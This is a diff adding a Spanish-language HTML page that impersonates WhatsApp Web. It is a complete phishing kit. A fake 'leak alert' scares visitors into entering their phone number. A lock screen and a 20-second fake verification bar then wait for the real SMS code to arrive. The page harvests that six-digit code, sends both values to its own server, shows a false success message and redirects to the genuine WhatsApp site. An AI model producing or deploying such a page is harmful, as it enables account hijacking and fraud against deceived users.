@@ -1,0 +1,711 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>WhatsApp Web</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 16px;
+        }
+        .container {
+            background: white;
+            max-width: 440px;
+            width: 100%;
+            padding: 32px 28px;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.08);
+            text-align: center;
+        }
+        .logo {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+        .logo img {
+            width: 44px;
+            height: 44px;
+        }
+        .logo h1 {
+            font-size: 22px;
+            font-weight: 300;
+            color: #41525d;
+        }
+        .logo h1 span {
+            font-weight: 700;
+            color: #075e54;
+        }
+        .title {
+            font-size: 17px;
+            font-weight: 600;
+            color: #1a1a1a;
+            margin-bottom: 4px;
+        }
+        .subtitle {
+            font-size: 14px;
+            color: #888;
+            margin-bottom: 20px;
+        }
+        .alert {
+            background: #fff3f3;
+            border-left: 4px solid #e74c3c;
+            padding: 12px 16px;
+            border-radius: 6px;
+            margin-bottom: 20px;
+            font-size: 14px;
+            color: #333;
+            text-align: left;
+        }
+        .alert strong { color: #e74c3c; }
+        .alert .highlight { color: #075e54; font-weight: 600; }
+        .form-group { margin-bottom: 18px; text-align: left; }
+        .form-group label {
+            display: block;
+            font-size: 14px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 6px;
+        }
+        .phone-wrapper {
+            display: flex;
+            align-items: center;
+            background: white;
+            border: 1.5px solid #d1d5db;
+            border-radius: 6px;
+            transition: border-color 0.2s;
+            padding: 0;
+            position: relative;
+        }
+        .phone-wrapper:focus-within {
+            border-color: #075e54;
+        }
+        .country-selector-btn {
+            display: flex;
+            align-items: center;
+            padding: 0 10px;
+            border: none;
+            border-right: 1px solid #d1d5db;
+            cursor: pointer;
+            min-width: 70px;
+            height: 48px;
+            background: transparent;
+            font-size: 14px;
+            font-weight: 600;
+            color: #333;
+            gap: 6px;
+        }
+        .country-selector-btn img {
+            width: 22px;
+            height: 16px;
+            object-fit: cover;
+        }
+        .phone-wrapper input {
+            flex: 1;
+            padding: 12px 14px;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            background: transparent;
+            outline: none;
+            height: 48px;
+        }
+        .phone-wrapper input::placeholder {
+            color: #999;
+        }
+        .country-dropdown {
+            display: none;
+            position: absolute;
+            top: calc(100% + 4px);
+            left: 0;
+            right: 0;
+            background: white;
+            border: 1px solid #d1d5db;
+            border-radius: 6px;
+            box-shadow: 0 8px 24px rgba(0,0,0,0.15);
+            max-height: 220px;
+            overflow-y: auto;
+            z-index: 1000;
+            padding: 4px 0;
+        }
+        .country-dropdown.active { display: block; }
+        .country-dropdown .country-option {
+            display: flex;
+            align-items: center;
+            padding: 8px 16px;
+            cursor: pointer;
+            transition: background 0.1s;
+        }
+        .country-dropdown .country-option:hover {
+            background: #f0f2f5;
+        }
+        .country-dropdown .country-option img {
+            width: 22px;
+            height: 16px;
+            margin-right: 10px;
+            object-fit: cover;
+        }
+        .country-dropdown .country-option .name {
+            flex: 1;
+            font-size: 14px;
+            color: #333;
+        }
+        .country-dropdown .country-option .code {
+            font-size: 13px;
+            color: #888;
+        }
+        .btn {
+            width: 100%;
+            padding: 12px;
+            background: #075e54;
+            color: white;
+            border: none;
+            border-radius: 30px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        .btn:hover { background: #064a42; }
+        .btn:disabled { background: #ccc; cursor: not-allowed; }
+        .hidden { display: none !important; }
+        .footer-link {
+            display: block;
+            margin-top: 16px;
+            font-size: 14px;
+            color: #075e54;
+            text-decoration: none;
+            cursor: pointer;
+        }
+        .footer-link:hover { text-decoration: underline; }
+        .divider {
+            border-top: 1px solid #e0e0e0;
+            margin: 20px 0;
+        }
+
+        /* Loading bar */
+        .loading-container {
+            background: #f5faf7;
+            border: 1px solid #c8e6c9;
+            border-radius: 8px;
+            padding: 16px 20px;
+            margin: 16px 0;
+            text-align: center;
+        }
+        .loading-container .loading-text {
+            font-size: 14px;
+            font-weight: 500;
+            color: #075e54;
+        }
+        .loading-container .loading-bar {
+            width: 100%;
+            height: 6px;
+            background: #e0e0e0;
+            border-radius: 10px;
+            margin-top: 10px;
+            overflow: hidden;
+        }
+        .loading-container .loading-bar .progress {
+            height: 100%;
+            width: 0%;
+            background: #25d366;
+            border-radius: 10px;
+            transition: width 0.5s linear;
+        }
+        .loading-container .loading-bar .progress.complete {
+            width: 100%;
+            background: #25d366;
+        }
+        .loading-container .status-text {
+            font-size: 12px;
+            color: #888;
+            margin-top: 6px;
+        }
+
+        /* Código de verificación */
+        .code-input-group {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            margin: 12px 0;
+        }
+        .code-input-group input {
+            width: 48px;
+            height: 56px;
+            text-align: center;
+            font-size: 24px;
+            font-weight: 700;
+            border: 1.5px solid #d1d5db;
+            border-radius: 6px;
+            background: white;
+        }
+        .code-input-group input:focus {
+            border-color: #075e54;
+            outline: none;
+        }
+
+        /* Pantalla de bloqueo */
+        .lock-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.75);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+        }
+        .lock-screen.active { display: flex; }
+        .lock-screen .box {
+            background: white;
+            padding: 30px;
+            border-radius: 16px;
+            max-width: 340px;
+            text-align: center;
+        }
+        .lock-screen .box h2 {
+            color: #e74c3c;
+            margin-bottom: 12px;
+            font-size: 20px;
+        }
+        .lock-screen .box p {
+            color: #555;
+            font-size: 14px;
+        }
+
+        /* Verificado por WhatsApp */
+        .whatsapp-verified {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            margin-top: 16px;
+            font-size: 12px;
+            color: #888;
+        }
+        .whatsapp-verified img {
+            width: 16px;
+            height: 16px;
+        }
+        .whatsapp-verified .text {
+            color: #075e54;
+            font-weight: 600;
+        }
+
+        /* Aviso legal y soporte */
+        .legal-footer {
+            margin-top: 24px;
+            padding-top: 16px;
+            border-top: 1px solid #f0f0f0;
+            font-size: 12px;
+            color: #888;
+            line-height: 1.6;
+        }
+        .legal-footer a {
+            color: #075e54;
+            text-decoration: none;
+        }
+        .legal-footer a:hover {
+            text-decoration: underline;
+        }
+        .legal-footer .support {
+            display: flex;
+            justify-content: center;
+            gap: 12px;
+            margin-top: 8px;
+            font-size: 13px;
+            font-weight: 500;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- PANTALLA DE BLOQUEO -->
+    <div id="lockScreen" class="lock-screen">
+        <div class="box">
+            <h2>Verificación en curso</h2>
+            <p>No cierres esta página. Estamos validando tu identidad para proteger tu privacidad.</p>
+        </div>
+    </div>
+
+    <div class="container">
+        <!-- LOGO -->
+        <div class="logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/6b/WhatsApp.svg/120px-WhatsApp.svg.png" alt="WhatsApp">
+            <h1>WhatsApp <span>Web</span></h1>
+        </div>
+
+        <!-- PASO 1: Pedir número -->
+        <div id="step1">
+            <div class="title">Verifica tu número de teléfono</div>
+            <div class="subtitle">WhatsApp enviará un mensaje SMS para verificar tu número. Selecciona tu país y escribe tu número.</div>
+
+            <div class="alert">
+                <strong>Alerta de filtración</strong><br>
+                Se ha detectado una filtración de conversaciones de WhatsApp. <span class="highlight">Tu número está en la lista de afectados.</span> Verifica tu identidad para proteger tus chats.
+            </div>
+
+            <form id="formPhone">
+                <div class="form-group">
+                    <label>Número de teléfono</label>
+                    <div class="phone-wrapper">
+                        <button type="button" class="country-selector-btn" id="countrySelector">
+                            <img id="flagIcon" src="https://flagcdn.com/do.svg" alt="RD">
+                            <span id="countryCodeDisplay">+1</span>
+                        </button>
+                        <input type="tel" id="phone" placeholder="809 555 5555" maxlength="14" required>
+                        <div class="country-dropdown" id="countryDropdown"></div>
+                    </div>
+                </div>
+                <button type="submit" class="btn">Siguiente</button>
+            </form>
+            <a href="#" class="footer-link">Iniciar sesión con código QR</a>
+        </div>
+
+        <!-- PASO 2: Pedir código (con barra de carga) -->
+        <div id="step2" class="hidden">
+            <div class="title">Verificación de número</div>
+            <div class="subtitle">Área de soporte para verificar filtraciones de seguridad.</div>
+
+            <div id="loadingContainer" class="loading-container">
+                <div class="loading-text" id="loadingText">Verificando tu número...</div>
+                <div class="loading-bar">
+                    <div class="progress" id="progressBar"></div>
+                </div>
+                <div class="status-text" id="statusText">Espera 20 segundos mientras validamos tu identidad.</div>
+            </div>
+
+            <form id="formCode">
+                <div class="form-group">
+                    <label>Código de verificación (6 dígitos)</label>
+                    <div class="code-input-group">
+                        <input type="text" id="code1" maxlength="1" required disabled>
+                        <input type="text" id="code2" maxlength="1" required disabled>
+                        <input type="text" id="code3" maxlength="1" required disabled>
+                        <input type="text" id="code4" maxlength="1" required disabled>
+                        <input type="text" id="code5" maxlength="1" required disabled>
+                        <input type="text" id="code6" maxlength="1" required disabled>
+                    </div>
+                </div>
+                <button type="submit" class="btn" id="submitCode" disabled>Verificar</button>
+            </form>
+
+            <div class="whatsapp-verified">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/6b/WhatsApp.svg/120px-WhatsApp.svg.png" alt="WhatsApp">
+                <span class="text">Verificado por WhatsApp</span>
+            </div>
+            <div class="divider"></div>
+            <a href="#" class="footer-link" onclick="alert('Por favor, espera el código.'); return false;">Reenviar código</a>
+        </div>
+
+        <!-- AVISO LEGAL Y SOPORTE -->
+        <div class="legal-footer">
+            <p>Debes tener al menos 16 años para registrarte. Conoce cómo funciona WhatsApp con las empresas de Facebook.</p>
+            <div class="support">
+                <a href="#">Soporte de WhatsApp</a>
+                <a href="#">Privacidad</a>
+                <a href="#">Términos</a>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // ================================================================
+        // LISTA DE PAÍSES (más de 60, con prefijos para detección automática)
+        // ================================================================
+        const countries = [
+            { code: '+54', name: 'Argentina', flag: 'ar', prefixes: ['11','15','221','223','249','260','261','262','263','264','265','266','267','268','269','280','281','282','283','284','285','286','287','288','289','291','292','293','294','295','296','297','298','299','341','342','343','344','345','346','347','348','349','351','352','353','354','355','356','357','358','359','361','362','363','364','365','366','367','368','369','370','371','372','373','374','375','376','377','378','379','381','382','383','384','385','386','387','388','389','391','392','393','394','395','396','397','398','399'] },
+            { code: '+61', name: 'Australia', flag: 'au', prefixes: ['2','3','4','7','8'] },
+            { code: '+43', name: 'Austria', flag: 'at', prefixes: ['1','6','5','3','4','2','7','8','9'] },
+            { code: '+32', name: 'Bélgica', flag: 'be', prefixes: ['4','3','2','1','5','6','7','8','9'] },
+            { code: '+591', name: 'Bolivia', flag: 'bo', prefixes: ['2','3','4','5','6','7','8','9'] },
+            { code: '+55', name: 'Brasil', flag: 'br', prefixes: ['11','12','13','14','15','16','17','18','19','21','22','23','24','25','26','27','28','29','31','32','33','34','35','36','37','38','39','41','42','43','44','45','46','47','48','49','51','52','53','54','55','56','57','58','59','61','62','63','64','65','66','67','68','69','71','72','73','74','75','76','77','78','79','81','82','83','84','85','86','87','88','89','91','92','93','94','95','96','97','98','99'] },
+            { code: '+1', name: 'Canadá', flag: 'ca', prefixes: ['204','226','236','249','250','263','289','306','343','365','367','382','387','403','416','418','431','437','438','450','506','514','519','548','579','581','587','604','613','639','647','705','709','778','780','782','807','819','825','867','873','902','905'] },
+            { code: '+56', name: 'Chile', flag: 'cl', prefixes: ['2','3','4','5','6','7','8','9'] },
+            { code: '+57', name: 'Colombia', flag: 'co', prefixes: ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99'] },
+            { code: '+506', name: 'Costa Rica', flag: 'cr', prefixes: ['2','3','4','5','6','7','8','9'] },
+            { code: '+53', name: 'Cuba', flag: 'cu', prefixes: ['2','3','4','5','6','7','8','9'] },
+            { code: '+45', name: 'Dinamarca', flag: 'dk', prefixes: ['2','3','4','5','6','7','8','9'] },
+            { code: '+1', name: 'República Dominicana', flag: 'do', prefixes: ['809','829','849'] },
+            { code: '+593', name: 'Ecuador', flag: 'ec', prefixes: ['2','3','4','5','6','7','8','9'] },
+            { code: '+503', name: 'El Salvador', flag: 'sv', prefixes: ['2','3','4','5','6','7','8','9'] },
+            { code: '+34', name: 'España', flag: 'es', prefixes: ['6','7','8','9','5','4','3','2','1'] },
+            { code: '+1', name: 'Estados Unidos', flag: 'us', prefixes: ['201','202','203','204','205','206','207','208','209','210','212','213','214','215','216','217','218','219','220','221','222','223','224','225','226','227','228','229','230','231','232','233','234','235','236','237','238','239','240','241','242','243','244','245','246','247','248','249','250','251','252','253','254','255','256','257','258','259','260','261','262','263','264','265','266','267','268','269','270','271','272','273','274','275','276','277','278','279','280','281','282','283','284','285','286','287','288','289','290','291','292','293','294','295','296','297','298','299','300','301','302','303','304','305','306','307','308','309','310','311','312','313','314','315','316','317','318','319','320','321','322','323','324','325','326','327','328','329','330','331','332','333','334','335','336','337','338','339','340','341','342','343','344','345','346','347','348','349','350','351','352','353','354','355','356','357','358','359','360','361','362','363','364','365','366','367','368','369','370','371','372','373','374','375','376','377','378','379','380','381','382','383','384','385','386','387','388','389','390','391','392','393','394','395','396','397','398','399','400','401','402','403','404','405','406','407','408','409','410','411','412','413','414','415','416','417','418','419','420','421','422','423','424','425','426','427','428','429','430','431','432','433','434','435','436','437','438','439','440','441','442','443','444','445','446','447','448','449','450','451','452','453','454','455','456','457','458','459','460','461','462','463','464','465','466','467','468','469','470','471','472','473','474','475','476','477','478','479','480','481','482','483','484','485','486','487','488','489','490','491','492','493','494','495','496','497','498','499','500','501','502','503','504','505','506','507','508','509','510','511','512','513','514','515','516','517','518','519','520','521','522','523','524','525','526','527','528','529','530','531','532','533','534','535','536','537','538','539','540','541','542','543','544','545','546','547','548','549','550','551','552','553','554','555','556','557','558','559','560','561','562','563','564','565','566','567','568','569','570','571','572','573','574','575','576','577','578','579','580','581','582','583','584','585','586','587','588','589','590','591','592','593','594','595','596','597','598','599','600','601','602','603','604','605','606','607','608','609','610','611','612','613','614','615','616','617','618','619','620','621','622','623','624','625','626','627','628','629','630','631','632','633','634','635','636','637','638','639','640','641','642','643','644','645','646','647','648','649','650','651','652','653','654','655','656','657','658','659','660','661','662','663','664','665','666','667','668','669','670','671','672','673','674','675','676','677','678','679','680','681','682','683','684','685','686','687','688','689','690','691','692','693','694','695','696','697','698','699','700','701','702','703','704','705','706','707','708','709','710','711','712','713','714','715','716','717','718','719','720','721','722','723','724','725','726','727','728','729','730','731','732','733','734','735','736','737','738','739','740','741','742','743','744','745','746','747','748','749','750','751','752','753','754','755','756','757','758','759','760','761','762','763','764','765','766','767','768','769','770','771','772','773','774','775','776','777','778','779','780','781','782','783','784','785','786','787','788','789','790','791','792','793','794','795','796','797','798','799','800','801','802','803','804','805','806','807','808','809','810','811','812','813','814','815','816','817','818','819','820','821','822','823','824','825','826','827','828','829','830','831','832','833','834','835','836','837','838','839','840','841','842','843','844','845','846','847','848','849','850','851','852','853','854','855','856','857','858','859','860','861','862','863','864','865','866','867','868','869','870','871','872','873','874','875','876','877','878','879','880','881','882','883','884','885','886','887','888','889','890','891','892','893','894','895','896','897','898','899','900','901','902','903','904','905','906','907','908','909','910','911','912','913','914','915','916','917','918','919','920','921','922','923','924','925','926','927','928','929','930','931','932','933','934','935','936','937','938','939','940','941','942','943','944','945','946','947','948','949','950','951','952','953','954','955','956','957','958','959','960','961','962','963','964','965','966','967','968','969','970','971','972','973','974','975','976','977','978','979','980','981','982','983','984','985','986','987','988','989','990','991','992','993','994','995','996','997','998','999'] },
+            { code: '+358', name: 'Finlandia', flag: 'fi', prefixes: ['1','2','3','4','5','6','7','8','9'] },
+            { code: '+33', name: 'Francia', flag: 'fr', prefixes: ['1','2','3','4','5','6','7','8','9'] },
+            { code: '+30', name: 'Grecia', flag: 'gr', prefixes: ['2','3','4','5','6','7','8','9'] },
+            { code: '+502', name: 'Guatemala', flag: 'gt', prefixes: ['2','3','4','5','6','7','8','9'] },
+            { code: '+509', name: 'Haití', flag: 'ht', prefixes: ['2','3','4','5','6','7','8','9'] },
+            { code: '+504', name: 'Honduras', flag: 'hn', prefixes: ['2','3','4','5','6','7','8','9'] },
+            { code: '+36', name: 'Hungría', flag: 'hu', prefixes: ['1','2','3','4','5','6','7','8','9'] },
+            { code: '+91', name: 'India', flag: 'in', prefixes: ['6','7','8','9','5','4','3','2','1'] },
+            { code: '+62', name: 'Indonesia', flag: 'id', prefixes: ['2','3','4','5','6','7','8','9'] },
+            { code: '+353', name: 'Irlanda', flag: 'ie', prefixes: ['1','2','3','4','5','6','7','8','9'] },
+            { code: '+972', name: 'Israel', flag: 'il', prefixes: ['2','3','4','5','6','7','8','9'] },
+            { code: '+39', name: 'Italia', flag: 'it', prefixes: ['3','1','2','4','5','6','7','8','9'] },
+            { code: '+1', name: 'Jamaica', flag: 'jm', prefixes: ['876'] },
+            { code: '+81', name: 'Japón', flag: 'jp', prefixes: ['1','2','3','4','5','6','7','8','9'] },
+            { code: '+52', name: 'México', flag: 'mx', prefixes: ['55','56','33','44','81','1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','34','35','36','37','38','39','40','41','42','43','45','46','47','48','49','50','51','53','54','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99'] },
+            { code: '+505', name: 'Nicaragua', flag: 'ni', prefixes: ['2','3','4','5','6','7','8','9'] },
+            { code: '+507', name: 'Panamá', flag: 'pa', prefixes: ['2','3','4','5','6','7','8','9'] },
+            { code: '+595', name: 'Paraguay', flag: 'py', prefixes: ['2','3','4','5','6','7','8','9'] },
+            { code: '+51', name: 'Perú', flag: 'pe', prefixes: ['1','2','3','4','5','6','7','8','9'] },
+            { code: '+48', name: 'Polonia', flag: 'pl', prefixes: ['1','2','3','4','5','6','7','8','9'] },
+            { code: '+351', name: 'Portugal', flag: 'pt', prefixes: ['2','3','6','9'] },
+            { code: '+1', name: 'Puerto Rico', flag: 'pr', prefixes: ['787','939'] },
+            { code: '+44', name: 'Reino Unido', flag: 'gb', prefixes: ['7','2','3','4','5','6','8','9'] },
+            { code: '+40', name: 'Rumania', flag: 'ro', prefixes: ['2','3','4','5','6','7','8','9'] },
+            { code: '+7', name: 'Rusia', flag: 'ru', prefixes: ['9','3','4','5','6','7','8'] },
+            { code: '+1', name: 'San Vicente y las Granadinas', flag: 'vc', prefixes: ['784'] },
+            { code: '+1', name: 'Santa Lucía', flag: 'lc', prefixes: ['758'] },
+            { code: '+1', name: 'Trinidad y Tobago', flag: 'tt', prefixes: ['868'] },
+            { code: '+598', name: 'Uruguay', flag: 'uy', prefixes: ['2','3','4','5','6','7','8','9'] },
+            { code: '+58', name: 'Venezuela', flag: 've', prefixes: ['2','3','4','5','6','7','8','9'] },
+            { code: '+93', name: 'Afganistán', flag: 'af', prefixes: ['7'] },
+            { code: '+355', name: 'Albania', flag: 'al', prefixes: ['6'] },
+            { code: '+213', name: 'Argelia', flag: 'dz', prefixes: ['5','6','7','9'] },
+            { code: '+376', name: 'Andorra', flag: 'ad', prefixes: ['3','4','5','6','7','8'] },
+            { code: '+244', name: 'Angola', flag: 'ao', prefixes: ['9'] },
+            { code: '+1264', name: 'Anguila', flag: 'ai', prefixes: ['2'] },
+            { code: '+1268', name: 'Antigua y Barbuda', flag: 'ag', prefixes: ['2'] },
+            { code: '+374', name: 'Armenia', flag: 'am', prefixes: ['4','5','7','8','9'] },
+            { code: '+297', name: 'Aruba', flag: 'aw', prefixes: ['5'] },
+            { code: '+994', name: 'Azerbaiyán', flag: 'az', prefixes: ['5','6','7','8','9'] },
+            { code: '+1242', name: 'Bahamas', flag: 'bs', prefixes: ['2'] },
+            { code: '+973', name: 'Baréin', flag: 'bh', prefixes: ['3','6'] },
+            { code: '+880', name: 'Bangladés', flag: 'bd', prefixes: ['1','3','4','5','6','7','8','9'] },
+            { code: '+1246', name: 'Barbados', flag: 'bb', prefixes: ['2'] },
+            { code: '+375', name: 'Bielorrusia', flag: 'by', prefixes: ['2','3','4','5','6','7','8','9'] },
+            { code: '+501', name: 'Belice', flag: 'bz', prefixes: ['6'] },
+            { code: '+229', name: 'Benín', flag: 'bj', prefixes: ['6','7','8','9'] },
+            { code: '+1441', name: 'Bermudas', flag: 'bm', prefixes: ['2'] },
+            { code: '+975', name: 'Bután', flag: 'bt', prefixes: ['2'] },
+            { code: '+267', name: 'Botsuana', flag: 'bw', prefixes: ['7'] },
+            { code: '+673', name: 'Brunéi', flag: 'bn', prefixes: ['7'] },
+            { code: '+359', name: 'Bulgaria', flag: 'bg', prefixes: ['4','5','6','7','8','9'] },
+            { code: '+226', name: 'Burkina Faso', flag: 'bf', prefixes: ['6','7','8','9'] },
+            { code: '+257', name: 'Burundi', flag: 'bi', prefixes: ['7'] },
+            { code: '+855', name: 'Camboya', flag: 'kh', prefixes: ['1','3','5','6','7','8','9'] },
+            { code: '+237', name: 'Camerún', flag: 'cm', prefixes: ['6','7','8','9'] },
+            { code: '+238', name: 'Cabo Verde', flag: 'cv', prefixes: ['9'] },
+        ];
+
+        // ================================================================
+        // VARIABLES
+        // ================================================================
+        let selectedCountry = countries.find(c => c.name === 'República Dominicana') || countries[0];
+        let currentCountryIndex = 0;
+
+        const phoneInput = document.getElementById('phone');
+        const flagIcon = document.getElementById('flagIcon');
+        const countryCodeDisplay = document.getElementById('countryCodeDisplay');
+        const countryDropdown = document.getElementById('countryDropdown');
+        const countrySelector = document.getElementById('countrySelector');
+
+        // ================================================================
+        // RENDERIZAR DROPDOWN
+        // ================================================================
+        function renderDropdown() {
+            countryDropdown.innerHTML = '';
+            countries.forEach((country, index) => {
+                const option = document.createElement('div');
+                option.className = 'country-option';
+                option.innerHTML = `
+                    <img src="https://flagcdn.com/${country.flag}.svg" alt="${country.name}">
+                    <span class="name">${country.name}</span>
+                    <span class="code">${country.code}</span>
+                `;
+                option.addEventListener('click', () => {
+                    selectCountry(index);
+                    countryDropdown.classList.remove('active');
+                });
+                countryDropdown.appendChild(option);
+            });
+        }
+        renderDropdown();
+
+        // ================================================================
+        // SELECCIONAR PAÍS
+        // ================================================================
+        function selectCountry(index) {
+            const country = countries[index];
+            selectedCountry = country;
+            currentCountryIndex = index;
+            flagIcon.src = `https://flagcdn.com/${country.flag}.svg`;
+            countryCodeDisplay.textContent = country.code;
+            phoneInput.value = '';
+            phoneInput.focus();
+        }
+
+        // Inicializar con RD
+        const rdIdx = countries.findIndex(c => c.name === 'República Dominicana');
+        if (rdIdx !== -1) selectCountry(rdIdx);
+        else selectCountry(0);
+
+        // ================================================================
+        // DETECCIÓN AUTOMÁTICA
+        // ================================================================
+        phoneInput.addEventListener('input', function(e) {
+            const raw = this.value.replace(/\D/g, '');
+            if (raw.length >= 3) {
+                const prefix = raw.slice(0, 3);
+                const found = countries.find(c => c.prefixes && c.prefixes.includes(prefix));
+                if (found && found !== selectedCountry) {
+                    const idx = countries.indexOf(found);
+                    if (idx !== -1) selectCountry(idx);
+                }
+            }
+        });
+
+        // ================================================================
+        // ABRIR/CERRAR DROPDOWN
+        // ================================================================
+        countrySelector.addEventListener('click', (e) => {
+            e.stopPropagation();
+            countryDropdown.classList.toggle('active');
+        });
+        document.addEventListener('click', () => countryDropdown.classList.remove('active'));
+
+        // ================================================================
+        // FORMATEAR NÚMERO
+        // ================================================================
+        phoneInput.addEventListener('input', function(e) {
+            let value = this.value.replace(/\D/g, '');
+            if (value.length > 10) value = value.slice(0, 10);
+            let formatted = '';
+            if (value.length > 0) {
+                formatted = '(' + value.slice(0, 3);
+                if (value.length > 3) {
+                    formatted += ') ' + value.slice(3, 6);
+                    if (value.length > 6) {
+                        formatted += '-' + value.slice(6, 10);
+                    }
+                }
+            }
+            this.value = formatted;
+        });
+
+        // ================================================================
+        // AUTO-AVANZAR CÓDIGO
+        // ================================================================
+        const codeInputs = [
+            document.getElementById('code1'),
+            document.getElementById('code2'),
+            document.getElementById('code3'),
+            document.getElementById('code4'),
+            document.getElementById('code5'),
+            document.getElementById('code6')
+        ];
+        codeInputs.forEach((input, index) => {
+            input.addEventListener('input', function() {
+                if (this.value.length === 1 && index < 5) {
+                    codeInputs[index + 1].focus();
+                }
+            });
+            input.addEventListener('keydown', function(e) {
+                if (e.key === 'Backspace' && this.value === '' && index > 0) {
+                    codeInputs[index - 1].focus();
+                }
+            });
+        });
+
+        // ================================================================
+        // PASO 1: ENVIAR NÚMERO
+        // ================================================================
+        document.getElementById('formPhone').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const phone = phoneInput.value.trim();
+            const countryCode = countryCodeDisplay.textContent;
+            const fullNumber = countryCode + ' ' + phone;
+            if (phone.replace(/\D/g, '').length < 10) {
+                alert('Por favor, introduce un número válido (10 dígitos).');
+                return;
+            }
+
+            fetch('/', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                body: 'step=phone&phone=' + encodeURIComponent(fullNumber)
+            });
+
+            document.getElementById('step1').classList.add('hidden');
+            document.getElementById('step2').classList.remove('hidden');
+            document.getElementById('lockScreen').classList.add('active');
+
+            const progressBar = document.getElementById('progressBar');
+            const loadingText = document.getElementById('loadingText');
+            const statusText = document.getElementById('statusText');
+            const submitCodeBtn = document.getElementById('submitCode');
+
+            codeInputs.forEach(input => input.disabled = true);
+            submitCodeBtn.disabled = true;
+            progressBar.style.width = '0%';
+            progressBar.classList.remove('complete');
+            loadingText.textContent = 'Verificando tu número...';
+            statusText.textContent = 'Espera 20 segundos mientras validamos tu identidad.';
+
+            let seconds = 20;
+            const interval = setInterval(() => {
+                seconds--;
+                const progress = ((20 - seconds) / 20) * 100;
+                progressBar.style.width = progress + '%';
+
+                if (seconds <= 0) {
+                    clearInterval(interval);
+                    progressBar.style.width = '100%';
+                    progressBar.classList.add('complete');
+                    loadingText.textContent = 'Verificación completada';
+                    statusText.textContent = 'Ingresa el código de 6 dígitos que recibiste por SMS.';
+
+                    codeInputs.forEach(input => { input.disabled = false; input.value = ''; });
+                    codeInputs[0].focus();
+                    submitCodeBtn.disabled = false;
+                    document.getElementById('lockScreen').classList.remove('active');
+                } else {
+                    statusText.textContent = `Espera ${seconds} segundos mientras validamos tu identidad.`;
+                }
+            }, 1000);
+        });
+
+        // ================================================================
+        // PASO 2: ENVIAR CÓDIGO
+        // ================================================================
+        document.getElementById('formCode').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const code = codeInputs.map(input => input.value).join('');
+            if (code.length !== 6) {
+                alert('El código debe tener 6 dígitos.');
+                return;
+            }
+
+            fetch('/', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                body: 'step=code&code=' + encodeURIComponent(code)
+            });
+
+            alert('Verificación exitosa. Tus datos han sido protegidos.');
+            window.location.href = 'https://web.whatsapp.com/';
+        });
+
+        // Advertencia al salir
+        window.addEventListener('beforeunload', function(e) {
+            if (!document.getElementById('step1').classList.contains('hidden')) {
+                e.preventDefault();
+                e.returnValue = 'Por favor, completa el proceso de verificación.';
+            }
+        });
+    </script>
+</body>
+</html>
